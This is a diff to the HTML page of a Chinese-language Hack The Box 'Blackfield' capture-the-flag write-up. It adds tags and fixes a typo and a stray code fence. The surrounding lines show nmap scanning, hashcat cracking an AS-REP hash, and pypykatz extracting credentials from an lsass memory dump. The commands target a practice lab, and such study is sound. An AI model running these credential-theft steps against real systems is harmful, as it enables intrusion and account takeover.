@@ -8,7 +8,7 @@
 <meta name="author" content="Enil ">
 <meta name="description" content="初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali/Blackfield] └─$ sudo nmap --min-rate 10000 -p- 10.129.229.17 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 22:32 -0400 Nmap scan report for 10.129.229.17 Host is up (0.27s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 21.72 seconds 提取端口做备用。
 " />
-<meta name="keywords" content=", Hack, Writeup, HTB, SMB, RPC, Impacket, lookupsids, GetNPUsers" />
+<meta name="keywords" content=", Hack, Writeup, HTB, SMB, RPC, Impacket, lookupsids, GetNPUsers, BloodHound, ForceChangePassword, Windows, DMP, SeBackupPrivilege, Securetsdump" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="http://localhost:1313/posts/htb-blackfield-writeup/" />
@@ -45,7 +45,7 @@
   <meta itemprop="datePublished" content="2026-04-27T10:00:00+08:00">
   <meta itemprop="dateModified" content="2026-04-27T10:00:00+08:00">
   <meta itemprop="wordCount" content="6174">
-  <meta itemprop="keywords" content="Hack,Writeup,HTB,SMB,RPC,Impacket,Lookupsids,GetNPUsers">
+  <meta itemprop="keywords" content="Hack,Writeup,HTB,SMB,RPC,Impacket,Lookupsids,GetNPUsers,BloodHound,ForceChangePassword,Windows,DMP,SeBackupPrivilege,Securetsdump">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="HTB-Blackfield Writeup">
@@ -713,8 +713,7 @@
 </span></span><span style="display:flex;"><span>4f694e3efe5e0a11a0d1e9cf965011b6eabd88ab3b684cc38af7fdc4e926361dd3f1c46e09156b2f87e40228fa1b75ff7556b1a9695ed480e8f291f4aa52b5b4da279dfefc88b4341ba639177d0e3a35cf94b4479d18e2971e59399fe9706cc16465bc3e31b9452931
 </span></span><span style="display:flex;"><span>ebcc43b322f95f2f01911ba1f5d732595cb41b8c38be1c78ad720b2e748eea49adf93956cc08a7e9102ce500f06fb0854cbcc6895dd6120781e26732ff2dfeb0c19e09647514 
 </span></span></code></pre></div><p>执行 hashcat 爆破。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">18200</span> Directory/support_hash.txt /usr/share/wordlists/rockyou.txt
 </span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v7.1.2<span style="color:#f92672">)</span> starting
 </span></span><span style="display:flex;"><span>
@@ -1106,7 +1105,7 @@
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield/smb_forensic<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah lsass.DMP 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2781568</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 137M Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> lsass.DMP
-</span></span></code></pre></div><p>用 pypykata dump lsass，并将结果保存下来。</p>
+</span></span></code></pre></div><p>用 pypykatz dump lsass，并将结果保存下来。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ pypykatz lsa minidump lsass.DMP | tee ../lass.txt
 </span></span><span style="display:flex;"><span>FILE: <span style="color:#f92672">========</span> lsass.DMP <span style="color:#f92672">=======</span>
@@ -1971,6 +1970,12 @@
         <span class="tag"><a href="http://localhost:1313/tags/impacket/">Impacket</a></span>
         <span class="tag"><a href="http://localhost:1313/tags/lookupsids/">lookupsids</a></span>
         <span class="tag"><a href="http://localhost:1313/tags/getnpusers/">GetNPUsers</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/bloodhound/">BloodHound</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/forcechangepassword/">ForceChangePassword</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/windows/">Windows</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/dmp/">DMP</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/sebackupprivilege/">SeBackupPrivilege</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/securetsdump/">Securetsdump</a></span>
         
     </p>
 
